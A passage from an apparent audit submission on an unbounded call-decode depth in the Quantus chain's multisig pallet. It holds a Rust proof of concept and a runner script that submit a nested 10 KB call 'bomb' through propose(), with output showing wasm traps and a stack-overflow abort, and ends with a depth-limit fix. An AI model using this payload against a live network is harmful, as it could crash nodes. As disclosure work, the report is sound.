                                                0,
                                        )
                                        .expect("create_multisig");
                                        let bal_after = Balances::free_balance(&attacker);
                                        println!("create_multisig cost = {} planck", bal_before - bal_after);

                                        let ms = Multisig::derive_multisig_address(&signers, 2, 0);
                                        println!("calling propose() with the {}-byte bomb...", blob.len());
                                        let r = Multisig::propose(
                                                RuntimeOrigin::signed(attacker.clone()),
                                                ms,
                                                blob.try_into().unwrap(),
                                                1000u32,
                                        );
                                        println!("PROPOSE RETURNED: {:?}", r);
                                });
                        })
                        .unwrap();
                println!("JOINED OK: {:?}", h.join().is_ok());
        }
}
```

### Runner: `run_depth_poc.sh`

```bash
#!/usr/bin/env bash
# PoC runner: pallet-multisig unbounded inner-call decode depth.
# Repo: quantus chain, branch audit-comp-ready, HEAD 3b243b8
set -u
cd "$(dirname "$0")"

echo "############ 1. FACTS (real runtime, native) ############"
cargo test --release -q -p quantus-runtime --lib \
  depth_poc::poc_budget_under_production_max_call_size \
  -- --nocapture --test-threads=1 2>/dev/null | sed -n '/running/,/test result/p'

cargo test --release -q -p quantus-runtime --lib \
  depth_poc::poc_is_disabled_pallet_still_decodable \
  -- --nocapture --test-threads=1 2>/dev/null | sed -n '/running/,/test result/p'

echo
echo "############ 2. IN-WASM (real runtime blob, real executor cfg) ############"
for d in 100 1400 1600 3412; do
  POC_DEPTH=$d cargo test --release -q -p quantus-runtime --lib depth_poc::wasm_probe \
    -- --nocapture --test-threads=1 2>/dev/null \
    | grep -E "WASM POC|WASM RESULT" | cut -c1-100
done

echo
echo "############ 3. NATIVE break depth at the 1 MiB wasm stack budget ############"
for d in 700 850 3412; do
  POC_DEPTH=$d POC_STACK=1048576 cargo test --release -q -p quantus-runtime --lib \
    depth_poc::poc_decode_depth -- --nocapture --test-threads=1 2>&1 \
    | grep -E "POC depth|RESULT:|overflowed its stack"
done

echo
echo "############ 4. END-TO-END: attacker -> propose() at production config ############"
POC_DEPTH=3412 POC_STACK=1048576 cargo test --release -q -p quantus-runtime --lib \
  depth_poc::e2e -- --nocapture --test-threads=1 2>&1 \
  | grep -E "E2E |create_multisig cost|calling propose|PROPOSE RETURNED|overflowed its stack|fatal runtime"

echo
echo "############ 5. COST PER TRAP + executor recovery ############"
cargo test --release -q -p quantus-runtime --lib depth_poc::wasm_probe::poc_wasm_executor_recovers \
  -- --nocapture --test-threads=1 2>/dev/null | grep -E "call#"

echo
echo "############ 6. CONTROL: decode is reached, weight gate fires AFTER it ############"
POC_DEPTH=100 POC_STACK=1048576 cargo test --release -q -p pallet-multisig --lib \
  depth_poc::poc_propose_reaches_the_unbounded_decode -- --nocapture --test-threads=1 2>&1 \
  | grep -E "POC\(propose\)|submitting|PROPOSE RESULT"
```

### Verbatim output of `./run_depth_poc.sh`

```
############ 1. FACTS (real runtime, native) ############
running 1 test
production MaxCallSize        = 10240 bytes
bytes per nesting level      = 3
max nesting depth in budget  = 3412
blob at that depth           = 10239 bytes
frame_support::MAX_EXTRINSIC_DEPTH = 256
.
test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 54 filtered out; finished in 0.00s
running 1 test
decode of pallet_index(8) [Scheduler, disable_call] => false
decode of pallet_index(9) [Utility, enabled]        => true
.
test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 54 filtered out; finished in 0.00s

############ 2. IN-WASM (real runtime blob, real executor cfg) ############
WASM POC depth=100 call_bytes=303
WASM RESULT: Ok (decoded inside wasm, no trap)
WASM POC depth=1400 call_bytes=4203
WASM RESULT: Ok (decoded inside wasm, no trap)
WASM POC depth=1600 call_bytes=4803
WASM RESULT: Err(Execution aborted due to trap: wasm trap: out of bounds memory access
WASM POC depth=3412 call_bytes=10239
WASM RESULT: Err(Execution aborted due to trap: wasm trap: out of bounds memory access

############ 3. NATIVE break depth at the 1 MiB wasm stack budget ############
POC depth=700 stack=1048576 blob_bytes=2103
thread '<unknown>' (2835655) has overflowed its stack
POC depth=850 stack=1048576 blob_bytes=2553
thread '<unknown>' (2835670) has overflowed its stack
POC depth=3412 stack=1048576 blob_bytes=10239
thread '<unknown>' (2835685) has overflowed its stack

############ 4. END-TO-END: attacker -> propose() at production config ############
E2E depth=3412 stack=1048576 blob_bytes=10239 (MaxCallSize=10240)
create_multisig cost = 600000000000 planck
calling propose() with the 10239-byte bomb...
thread '<unknown>' (2835700) has overflowed its stack
fatal runtime error: stack overflow, aborting

############ 5. COST PER TRAP + executor recovery ############
call#1 depth=10   ok=true elapsed=299.91703ms
call#2 depth=3412 bytes=10239 ok=false elapsed=3.035804ms
call#3 depth=3412 bytes=10239 ok=false elapsed=2.735319ms
call#4 depth=3412 bytes=10239 ok=false elapsed=2.669615ms
call#5 depth=3412 bytes=10239 ok=false elapsed=2.666904ms
call#6 depth=3412 bytes=10239 ok=false elapsed=2.711368ms
call#7 depth=10   ok=true elapsed=63.595µs  <-- executor recovered?

############ 6. CONTROL: decode is reached, weight gate fires AFTER it ############
POC(propose) depth=100 stack=1048576 blob_bytes=303
submitting propose() with the nested blob...
PROPOSE RESULT: Err(DispatchErrorWithPostInfo { post_info: PostDispatchInfo { actual_weight: None, pays_fee: Yes }, error: Module(ModuleError { index: 2, error: [24, 0, 0, 0], message: Some("CallWeightExceedsLimit") }) })
```

#### Reading the output

* **Section 1** establishes the budget: 3 bytes per nesting level, so `MaxCallSize = 10240` permits 3,412 levels against a `MAX_EXTRINSIC_DEPTH` of 256. It also confirms `disable_call` *does* remove a variant from the codec, which is why `Utility` being enabled is what makes this reachable.
* **Section 2** is the authoritative measurement: inside the real runtime wasm, 4,203 bytes decodes fine and 4,803 bytes traps.
* **Sections 3 and 4** show the same boundary natively at the production 1 MiB stack, and section 4 confirms the whole path is reachable from an ordinary signed origin for a one-time 0.6 UNIT setup.
* **Section 5** quantifies the asymmetry and shows the executor is not poisoned.
* **Section 6 is the control that isolates the finding.** Identical call shape, identical code path, only the nesting depth differs. At depth 100 the pallet behaves exactly as designed and rejects the call with `CallWeightExceedsLimit`. At depth >=1,600 the runtime never gets to behave at all.

### Recommendation

Use the depth-limited decode the repository already provides, at both sites:

```rust
use codec::DecodeLimit;

// pallets/multisig/src/lib.rs:602
let decoded_call = <T as Config>::RuntimeCall::decode_all_with_depth_limit(
        frame_support::MAX_EXTRINSIC_DEPTH,
        &mut &call[..],
    )
    .map_err(|_| Self::err_burn_full_raw(Error::<T>::InvalidCall))?;

// pallets/multisig/src/lib.rs:1128 — same change against `proposal.call`
```

This restores intended behaviour rather than adding new behaviour: the decode now returns `Err`, so the pallet's existing `err_burn_full_raw` griefing mitigation fires as its author intended, and the `MaxInnerCallWeight` gate at `lib.rs:605` becomes reachable again.

Two notes on the fix:

* **Bounding `MaxCallSize` further does not fix this.** At 3 bytes per level even a 1 KB limit still permits \~340 levels, and the wasm stack fails around 1,500. A size bound only moves the threshold; the depth limit is the correct control.
* `frame/support/src/traits/preimages.rs:210,213,217` performs the same unbounded `RuntimeCall` decode. I am **not** reporting it, because on this runtime it is reachable only via Scheduler/Referenda and is therefore governance-gated and out of scope — but it is worth fixing in the same pass, since a future runtime that exposes a preimage path to unprivileged callers would reintroduce this exact bug.
